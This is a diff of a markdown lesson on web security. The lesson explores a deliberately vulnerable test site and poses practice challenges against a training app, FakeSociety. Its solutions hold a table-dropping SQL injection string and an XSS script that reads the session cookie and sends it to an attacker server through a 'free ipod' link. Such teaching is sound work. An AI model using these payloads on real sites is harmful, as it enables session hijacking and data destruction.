@@ -55,7 +55,7 @@ Let's go ahead and create an account: [sign up](http://testphp.vulnweb.com/signu
 
 Oh look, all of our account information, including credit card number, is being sent over HTTP.  Even an unsophisticated attacker could get this information.  Even your browser can show you!
 
-[Form Data](signup.png)
+![Form Data](signup.png)
 
 Let's kep browsing.  If we click around the artists, we can see that a query is formed in the URL bar:
 
@@ -90,6 +90,7 @@ Where is this file stored on the server?
 
 Is this writen in JavaScript?
 (probably not, PHP (snake-case))
+
 ---
 
 This is the kind of result you might get from deploying something in debug mode (both Django and React have "debug" and "production" modes).  You want helpful error messages for yourself while you are devloping, but users should not be given such detailed information.
@@ -180,11 +181,7 @@ You could think of spam posts as a very low-level form of cross-site scripting. 
 
 
 
-
-
-
 ## Challenges
-
 
 ### Setup
 The challenges for today will require a little bit of setup.  
@@ -230,7 +227,7 @@ Note: Your database might become corrupted as you work through this challenge.  
 You might find [this](https://sqlitebrowser.org/) helpful too.  It's a handy GUI for interacting with the database.  You can view the tables and make sample queries with it.
 
 ---
-###<span style="color: red;">Solution</span> 
+### <span style="color: red;">Solution</span> 
 In username:
 ```SQL
 username'; DROP TABLE posts;
@@ -252,7 +249,7 @@ This one is a little more complicated than the first.
 Your goal is to get an unsuspecting FakeSociety user to click on a link.  You'll have to figure out some way to get that content into FakeSociety's server, onto their page, and make it tempting enough to click.  That link will direct the user to your nefarious server (badActorServer.js) and take along the user's bank account session cookie.  That cookie contains the user's bank account login information.  You should see the users bank account login information displayed to you on the page.  Then--and here's the irony--you're going to go out and buy your own Ipod!
 
 ---
-###<span style="color: red;">Solution</span> 
+### <span style="color: red;">Solution</span> 
 In post:
 ```html
     <script>let baseUrl = 'http://127.0.0.1:5000/'; let decodedCookie = decodeURIComponent(document.cookie); let cookieArr = decodedCookie.split(';')[1]; let finalCookie = cookieArr.split("=")[1]; let complete = `${baseUrl}${finalCookie}`; console.log(complete); document.write(`<h1><a href=${complete}>Click here for a free ipod</a></h1>`)</script>
